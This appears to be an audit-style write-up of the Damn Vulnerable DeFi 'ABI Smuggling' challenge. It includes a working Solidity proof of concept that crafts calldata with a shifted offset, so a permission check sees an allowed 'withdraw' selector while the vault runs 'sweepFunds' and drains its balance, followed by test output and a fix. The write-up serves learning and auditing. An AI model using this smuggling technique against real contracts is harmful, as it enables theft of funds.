## High

### [H-1] The permission check reads the selector from a fixed spot, so an attacker can smuggle a banned call past it

**Description:**

`execute` is the only door into the vault. Before it runs a call it checks if the caller is allowed to run that function on that target.

```solidity
// src/abi-smuggling/AuthorizedExecutor.sol:46-61
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
    assembly {
        selector := calldataload(calldataOffset)
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);
}
```

The check reads the function selector from a **fixed byte position**, `4 + 32 * 3 = 100`. But the call it actually runs, `target.functionCall(actionData)`, uses the real `actionData` bytes.

Here is the problem. `actionData` is a dynamic type. When you call `execute`, the calldata is laid out like this:

```
byte 0   .. 4    execute() selector
byte 4   .. 36   target
byte 36  .. 68   offset that points to where actionData starts   <-- attacker controls this
byte 68  .. 100  length of actionData
byte 100 .. ...  actionData bytes (first 4 bytes are the inner selector)
```

The code assumes `actionData` always starts at byte 100, so it reads the selector from there. But the offset at byte 36 is chosen by the caller. By setting a different offset, the attacker can put a **safe, allowed selector at byte 100** to pass the check, while the real `actionData` sits somewhere else and calls a **banned function**. The vault checks one selector and runs another.

In this challenge the player is allowed only `withdraw` (`0xd9caed12`). The prize function `sweepFunds` (`0x85fb709d`), which sends the whole balance out, is not allowed. The attacker puts `withdraw` at byte 100 to pass the check, but points `actionData` at a `sweepFunds` call.

Location `src/abi-smuggling/AuthorizedExecutor.sol:46-61`.

**Impact:**

Likelihood `High` . Anyone with any one allowed selector can do it, and building the calldata is simple.

Risk `High` . The whole vault balance, 1,000,000 DVT, is stolen in one call.

**Proof of Concept:**

The player hand builds the calldata for `execute`. Byte 100 holds the allowed `withdraw` selector so the check passes, but the offset points `actionData` at a `sweepFunds(recovery, token)` call, so the vault sweeps everything to recovery.

```solidity
function test_abiSmugglingExploit() public {
    vm.startPrank(player, player);

    console.log("BEFORE ATTACK");
    console.log("vault DVT    :", token.balanceOf(address(vault)));
    console.log("recovery DVT :", token.balanceOf(recovery));

    // The real call we want the vault to run: sweepFunds(recovery, token)
    bytes memory realCall = abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, token);

    // Hand build the calldata for execute(target, actionData) so the check reads
    // the allowed withdraw selector, but the vault runs sweepFunds instead.
    bytes memory payload = abi.encodePacked(
        AuthorizedExecutor.execute.selector,        // [0..4)    execute()
        uint256(uint160(address(vault))),           // [4..36)   target = vault
        uint256(0x80),                              // [36..68)  offset to actionData -> points to byte 132
        uint256(0),                                 // [68..100) empty word (free space)
        bytes4(0xd9caed12), bytes28(0),             // [100..132) allowed withdraw selector, read by the check
        uint256(realCall.length),                   // [132..164) real length of actionData
        realCall                                    // [164..)   real sweepFunds calldata
    );

    // Send the crafted calldata straight to the vault
    (bool ok,) = address(vault).call(payload);
    require(ok, "exploit call failed");

    vm.stopPrank();

    console.log("AFTER ATTACK");
    console.log("vault DVT    :", token.balanceOf(address(vault)));
    console.log("recovery DVT :", token.balanceOf(recovery));

    assertEq(token.balanceOf(address(vault)), 0, "vault still has tokens");
    assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "recovery did not get all tokens");
}
```

Run test:

```
[PASS] test_abiSmugglingExploit() (gas: 65337)
Logs:
  BEFORE ATTACK
  vault DVT    : 1000000000000000000000000
  recovery DVT : 0
  AFTER ATTACK
  vault DVT    : 0
  recovery DVT : 1000000000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Before the attack the vault holds all 1,000,000 DVT. The player, allowed only `withdraw`, sends one crafted call. The check sees `withdraw` and passes, but the vault runs `sweepFunds` and sends the full balance to recovery. Vault ends at 0.

**Recommended Mitigation:**

Do not trust a fixed calldata position. Read the selector from `actionData` itself, so the checked selector is always the one that will run.

```diff
-   bytes4 selector;
-   uint256 calldataOffset = 4 + 32 * 3;
-   assembly {
-       selector := calldataload(calldataOffset)
-   }
+   bytes4 selector = bytes4(actionData[:4]);
```

***

## Low

### [L-1] `withdraw` changes state but emits no event

**Description:**

`withdraw` moves tokens and updates the last withdrawal time, but emits nothing.

```solidity
// src/abi-smuggling/SelfAuthorizedVault.sol:42-44
_lastWithdrawalTimestamp = block.timestamp;

SafeTransferLib.safeTransfer(token, recipient, amount);
```

With no event, offchain tools and watchers can not track withdrawals cleanly, they have to read state or trace calls.

**Impact:**

Likelihood `Low` 
Risk `Low` 

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Emit an event on withdraw, for example `emit Withdrawn(token, recipient, amount);`.

***

## Informational

### [I-1] `Initialized` event has address fields but none are indexed

**Description:**

The setup event carries an address but marks nothing as indexed.

```solidity
// src/abi-smuggling/AuthorizedExecutor.sol:19
event Initialized(address who, bytes32[] ids);
```

Without an indexed field, tools can not filter these logs by the `who` address.

**Impact:**

Likelihood `Info` 
Risk `Info` 

**Recommended Mitigation:**

Mark the address as indexed, `event Initialized(address indexed who, bytes32[] ids);`.

***
